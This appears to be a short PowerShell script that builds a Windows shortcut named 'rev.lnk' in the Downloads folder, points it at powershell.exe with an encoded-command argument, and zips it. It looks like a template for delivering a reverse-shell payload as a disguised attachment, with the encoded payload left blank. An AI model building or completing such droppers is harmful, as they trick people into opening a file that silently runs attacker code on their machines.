$shortcutFile = "$env:USERPROFILE\Downloads\rev.lnk"
$shortcutZipped = $shortcutFile + ".zip"

$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($shortcutFile)
$ShortCut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$ShortCut.Arguments = '-enc '
$ShortCut.Save()

Compress-Archive -Path $shortcutFile -DestinationPath $shortcutZipped